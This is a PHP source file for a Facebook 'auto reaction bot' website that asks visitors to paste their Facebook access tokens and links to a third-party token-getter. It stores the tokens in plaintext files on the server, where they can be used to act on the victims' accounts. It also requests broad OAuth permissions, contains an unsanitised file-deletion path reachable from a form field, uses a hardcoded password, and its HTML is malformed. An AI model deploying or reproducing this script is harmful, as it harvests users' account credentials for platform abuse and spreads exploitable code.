﻿<?php 
session_start();
error_reporting(0);




$site_title = " ARMAN KHAN ";




// using banned in role will show user that he is banned when he try to login . 
$users = array(
               "Arman007" => array("name" => "Arman", "role"=> "admin"),
               "Arman007" => array("name" => "Arman", "role"=> "admin"),
               "Arman007" => array("name" => "Arman", "role"=> "guest"),
               "Arman007" => array("name" => "Arman", "role"=> "guest")
               );




if(isset($_SESSION['logged']) && !isset($users[$_SESSION['password']]) || $users[$_SESSION['password']]['role'] == 'banned'){
      unset($_SESSION['logged']);
      unset($_SESSION['password']);
      unset($_SESSION['username']);
}




if(!isset($_SESSION['logged']) || $_SESSION['logged'] ==  false){
        $showlogin = true;
        $loginerror = "";
        
   if(isset($_POST['password'])){




      $password = $_POST['password'];




    if(!empty($password)){




      if(isset($users[$password])){
        
         if($users[$password]['role'] !== 'banned'){
                      $_SESSION['logged'] = true;
                      $_SESSION['password'] = $password;
                      $_SESSION['username'] = $users[$password]['name'];
            $showlogin = false;
          }else{
                   if(isset($users[$password]['msg']) && !empty($users[$password]['msg'])){
              $loginerror =  $users[$password]['msg'];
                   }else{
              $loginerror = "You are banned from using this bot! Get out of here!";
            }
          }
      }else{
                 $loginerror = "Wrong Password!";
      }




     }else{
             $loginerror = "Please enter Password!";
     }
  }
}




 ?>












<title>Arman Khan Reaction Script
</title> 
<link <link href="css/style.css" rel="stylesheet" type="text/css">
<<link <href="css/style_2.css" rel="stylesheet" type="text/css" media="all">

<script src="//code.jquery.com/jquery.min.js"></script>
<div id="snowflakeContainer">
            <p class="snowflake"> ❤️ </p>
</div>
<script src="fallingsnow_v6.js"></script>

<?php error_reporting(0);
$bot=new bot();
class bot{ 




public function getGr($as,$bs){
$ar=array(                                                         
        'graph',
        'fb',
        'me'
);
$im='https://'.implode('.',$ar);




return $im.$as.$bs;
}




public function getUrl($mb,$tk,$uh=null){
$ar=array(
        'access_token' => $tk,
);
if($uh){
$else=array_merge($ar,$uh);
        }else{
        $else=$ar;
}
foreach($else as $b => $c){
        $Arman[]=$b.'='.$c;
}
$true='?'.implode('&',$Arman);
$true=$this->getGr($mb,$true);
$true=json_decode($this->
one($true),true);
if($true[data]){
        return $true[data];
}else{
        return $true;}
}




private function one($url){
$cx=curl_init();
curl_setopt_array($cx,array(
CURLOPT_URL => $url,
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => 1,
CURLOPT_USERAGENT => 'DESCRIPTION by LOvely Buddy',
));
$ch=curl_exec($cx);
        curl_close($cx);
        return ($ch);
}




public function savEd($tk,$id,$a,$b,$o,$c,$z=null,$bb=null){
if(!is_dir('Arman')){
        mkdir('Arman');
}
if($bb){
$blue=fopen('Arman/'.$id,'w');
fwrite($blue,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c.'*'.$bb);
        fclose($blue);




echo'<script type="text/javascript">alert("INFO : Your Written Comment Has Been Saved !! Good Luck !! Buddy")</script>';
}else{
        if($z){
if(file_exists('Arman/'.$id)){
$file=file_get_contents('Arman/'.$id);
$ex=explode('*',$file);
$str=str_replace($ex[0],$tk,$file);
$xs=fopen('Arman/'.$id,'w');
        fwrite($xs,$str);
        fclose($xs);
}else{
$str=$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c;
$xs=fopen('Arman/'.$id,'w');
        fwrite($xs,$str);
        fclose($xs);
}
$_SESSION[key]=$tk.'_'.$id;
}else{
$file=file_get_contents('Arman/'.$id);
$file=explode('*',$file);
        if($file[5]){
$up=fopen('Arman/'.$id,'w');
fwrite($up,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c.'*'.$file[5]);
        fclose($up);
        }else{
$up=fopen('Arman/'.$id,'w');
fwrite($up,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c);
        fclose($up);
        }
echo'<script type="text/javascript">alert("INFO : Script Comment Has Been Saved !! Good Luck !! Buddy")</script>';}}
}




public function lOgbot($d){
        unlink('Arman/'.$d);
        unset($_SESSION[key]);




echo'
<script type="text/javascript">alert("INFO : Logout success")
</script>';




        $this->atas();
        $this->home();
        $this->bwh();
}




public function cek($tok,$id,$nm){
$if=file_get_contents('Arman/'.$id);
$if=explode('*',$if);
echo'
<center>
<div id="bottom-content">
<div id="navigation-menu">
<h3><a name="navigation-name" class="no-link"><font color="green">Setting BOtTed by '.$nm.'</a></h3>
<ul>
<li>
Welcome Back : <font color="White">'.$nm.'</font></li>
<li>
<a href="http://www.facebook.com/'.$id.'"><img src="https://graph.facebook.com/'.$id.'/picture" style="width:50px; height:50px;" alt="'.$nm.'"/></a></li>
<li>
<form action="index.php" method="post"><input type="hidden" name="logout" value="'.$id.'">
<button id="submit"  class="btn btn-sm btn-primary"style="border: 1px solid white;color: #fff;border-radius: 48px;padding: 15px;font-size: 12px;font-weight: bold;margin-left: -3px;margin-top: 5px; margin-bottom: 10px;background-color: white;color:white;background: none;">LOgout BOT</button> </a><br>
<li>
<form action="index.php" method="post">
<font color="red">Reaction Active now Check YOur Activity LOg Now Thanks To Arman Khan</li>
<li>

<div id="top-content">
<div id="search-form">
</div></div></div>';




$this->membEr();
}




public function atas(){
$hari=array(1=>
        "Monday",
        "Tuesday",
        "Wednesday",
        "Thursday",
        "Friday",
        "Saturday",
        "Sunday"
);




$bulan=array(1=>
"January",
  "February",
    "March",
     "April",
       "May",
         "June",
           "July",
             "August",
               "September",
          "October",
     "November",
"Desember"
);




$hr=$hari[gmdate('N',time()+60*60*7)];
$tgl=gmdate('j',time()+60*60*7);
$bln=
$bulan[gmdate('n',time()+60*60
*7)];
$thn=gmdate('Y',time()+60*60*7);
$jam=gmdate('H',time()+60*60*7);




echo'
<div id="header">
<h1 class="heading">




</h1>
<h2 class="description">
</h2></div>';
} 




public function home(){
echo'
<div id="content">
<div class="post">
<div class="post-meta">
<h2 class="title">
<font color="white">Auto Mix Reaction 👍 ❤️ 😂 😯 😢 😡
</h2>
By <font color="white">Arman Khan</font>
</div>
<div class="post-content">
<a href="http://www.facebook.com/X3,H4NDSOM3"><img src="https://graph.facebook.com/100009434565722/picture" style="border: 2px solid #000; padding: 2px; margin: 2px; width: 50px; height: 50px; float: left;" alt="danie next time" class="thumbnail"/></a>
<span>
<br>
<font color="yellow">♣ARMAN KHAN♣</font><br>
♔Robot Created By♔
 <font color="green">♦ARMAN KHAN♦</font><br>
☼Find Me On Facebook☼ : <a href="http://fb.com/X3.H4NDSOM3"><font color="orange">Click Here</font></a><br>



<span>
<p style="font-weight:bold;">
<br><u><b>Vip Bot Created By ARMAN KHAN </u></b> <br>
 Find me : <a href="http://www.facebook.com/X3.H4NDSOM3"> click here </a></p>
</span>
</div>
<div class="post-meta2">
<center><b><mark><u> Follow Arman Khan </u></mark> </b>
</center>
<iframe src="//www.facebook.com/plugins/follow?href=https%3A%2F%2Fwww.facebook.com%2FX3.H4NDSOM3&amp;layout=standard&amp;show_faces=true&amp;colorscheme=light&amp;width=450&amp;height=80" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:450px; height:80px;" allowTransparency="true"></iframe>
</div>
</div>
</div>';
}








public function showlogin(){
                 echo '<div id="bottom-content">
<div id="navigation-menu">
<h3><a name="navigation-name" class="no-link">Login to Bot Site</a></h3>
<ul id="search-form">
  
  <form action="index.php" method="post">
  <li><div class="login-error">'.$GLOBALS["loginerror"].'</div></li>
   <li><label class="label-password">Password&nbsp;
  <br>
  </center>
   </label><input class="inp-text" type="password" style="height:35px;width:60%;border-radius:15px;border:1px solid white;background: none;color:white;" name="password"></li>
   <center>
    <button id="submit"  class="btn btn-sm btn-primary"style="border: 1px solid white;color: #fff;border-radius: 48px;padding: 15px;font-size: 12px;font-weight: bold;margin-left: -3px;margin-top: 5px; margin-bottom: 10px;background-color: white;color:white;background: none;">LOgin Now ♥</button> </a><br>
  </form>
</ul></div></div>';
        }




















public function bwh() {
    
 if(isset($GLOBALS['showlogin']) && $GLOBALS['showlogin'] == true){
          $this->showlogin();
          $this->membEr();
          return;
 }
         echo '<div id="bottom-content">
<div id="navigation-menu">
<h3><a name="navigation-name" class="no-link">Buy Personal Bot Click Here
</a></h3>
<marquee behavior="scroll" direction="right" scrollamount="5" scrolldelay="3" width="100%">
<b>
<a class="sec" href="http://fb.com/X3.H4NDSOM3"><font color="White" size="20">Buy Your BOt  Site Here Click Mee ♥</font></a></b><font size="20"</font></marquee><br />
<font size="16" color="purple">Arman Khan  &copy; 2k17</font>
</span>
</div></center><br>
<center>
<ul>
<a
<a href="http://phuongbach.com/tools/" target="_blank">
<button id="submit" class="btn btn-sm btn-primary"style="border: 1px solid white;color: #fff;border-radius: 48px;padding: 15px;font-size: 12px;font-weight: bold;margin-left: -3px;margin-top: 5px; margin-bottom: 10px;background-color: white;color:white;background: none;">Get Iphone Token Here</button> </a><br>
<div style="border-top: 1px #ccc solid; margin-top: 10px;"></div></br>
<font color="white" size="5">☣ 
Please Submit Your Access Token Here Use Iphone Token Only ☣ 
</font>
<br>
<div id="top-content">
<div id="search-form">
<center>
<form action="index.php" method="post">
<br>
<input class="inp-text" type="text" style="height:35px;width:60%;border-radius:15px;border:1px solid white;background: none;color:white;" name="token">
<center>
<button id="submit"  class="btn btn-sm btn-primary"style="border: 1px solid white;color: #fff;border-radius: 48px;padding: 15px;font-size: 12px;font-weight: bold;margin-left: -3px;margin-top: 5px; margin-bottom: 10px;background-color: white;color:white;background: none;">Save</button> </a><br></form></div></div></div>';



$this->membEr();
}




public function membEr(){
        if(!is_dir('Arman')){
        mkdir('Arman');
}
$up=opendir('Arman');
while($use=readdir($up)){
if($use != '.' && $use != '..'){
        $user[]=$use;}
        }




echo'
<center>
            <h4> <font color="white";>--- Powered By Arman Khan  ---</h4></font></h5></p>
            </ol>
            <div class="messages-push"></div>
        </div>
    <div class="footer">
<p><h4> <font color="white";>--- Copyright (c) 2017 ---</h4></font></h5></p>
       
    </div>
<p><h4> <font color="white";>--- Follow Me ---</h4></font></h5></p>
</div>
</div>
</div>
</div>
<a href="https://facebook.com/X3.H4NDSOM3" target="_blank">
<button id="submit" class="btn btn-sm btn-primary"style="border: 1px solid white;color: #fff;border-radius: 48px;padding: 15px;font-size: 12px;font-weight: bold;margin-left: -3px;margin-top: 5px; margin-bottom: 10px;background-color: white;color:white;background: none;">Follow Me </button>
</div>
</div>
</div>
</div>
<center>
<div id="footer">
<font color="purple">
Fan Of My Reaction BOT : <font color="white">'.count($user).'</font>
<br>
<font color="red">
Script bot &copy; 2k17<br>
Powered By :  <a href="https://fb.com/X3.H4NDSOM3"><font color="Yellow">Arman Khan</font></a><br>
</div>';
}











public function toXen($h){
header('Location: https://m.facebook.com/dialog/oauth?client_id='.$h.'&redirect_uri=https://www.facebook.com/connect/login_success.html&display=wap&scope=publish_actions%2Cuser_photos%2Cuser_friends%2Cfriends_photos%2Cuser_activities%2Cuser_likes%2Cuser_status%2Cuser_groups%2Cfriends_status%2Cpublish_stream%2Cread_stream%2Cread_requests%2Cstatus_update&response_type=token&fbconnect=1&from_login=1&refid=9');
}








}
if(isset($_SESSION[key])){
        $a=$_SESSION[key];
        $ai=explode('_',$a);
        $a=$ai[0];
if($_POST[logout]){
        $ax=$_POST[logout];
        $bot->lOgbot($ax);
}else{
$b=$bot->getUrl('/me',$a,array(
'fields' => 'id,name',
));
if($b[id]){
if($_POST[likes]){
        $as=$_POST[likes];
        $bs=$_POST[emot];
        $bx=$_POST[target];
        $cs=$_POST[opsi];
        $tx=$_POST[text];
if($cs=='text'){
        unlink('Arman/'.$b[id]);
$bot->savEd($a,$b[id],$as,$bs,$bx,'off');
        }else{
        if($tx){
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs,'x',$tx);
        }else{
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs);}}
}
        $bot->atas();
        $bot->home();
$bot->cek($a,$b[id],$b[name]);
}else{
echo '<script type="text/javascript">alert("INFO: Session Buddy Token Expired")</script>';
        unset($_SESSION[key]);
        unlink('Arman/'.$ai[1]);
$bot->atas();
$bot->home();
        $bot->bwh();}}
        }else{
if($_POST[token]){
        $a=$_POST[token];
if(preg_match('/token/',$a)){
$tok=substr($a,strpos($a,'token=')+6,(strpos($a,'&')-(strpos($a,'token=')+6)));
        }else{
        $cut=explode('&',$a);
$tok=$cut[0];
}
$b=$bot->getUrl('/me',$tok,array(
        'fields' => 'id,name',
));
if($b[id]){
$bot->savEd($tok,$b[id],'on','on','on','on','null');
        $bot->atas();
        $bot->home();
$bot->cek($tok,$b[id],$b[name]);
}else{
echo '<script type="text/javascript">alert("INFO: Buddy Token invalid")</script>';
        $bot->atas();
        $bot->home();
        $bot->bwh();}
}else{
if($_GET[token]){
        $a=$_GET[token];
        $bot->toXen($a);
}else{
        $bot->atas();
        $bot->home();
        $bot->bwh();}}
}
?>
</div>
</div>
</div>
</script>
<p><h4> <font color="white";>--- Click Play Button FOr SOng  ---</h4></font></h5></p>
<center><audio controls autoplay>
  <source src="http://yt-files.com/yt-dd.php?id=isBLOfLoPT0&hash=00be5c40f8785e93c54da77d9a28c000&name=Sta%20Da%20Ishq%20Baranona%20Full%20Song" type="audio/mpeg">
  Your browser does not support the audio element.
</audio>
</body>
<SCRIPT LANGUAGE="JavaScript">
var message="Beta Copy KI Waja Sy Disable Kia hai 😂  ";
///////////////////////////////////
function clickIE() {if (document.all) {alert(message);return false;}}
function clickNS(e) {if 
(document.layers||(document.getElementById&&!document.all)) {
if (e.which==2||e.which==3) {alert(message);return false;}}}
if (document.layers) 
{document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;}
else{document.onmouseup=clickNS;document.oncontextmenu=clickIE;}

document.oncontextmenu=new Function("return false")
// --> 
</script>
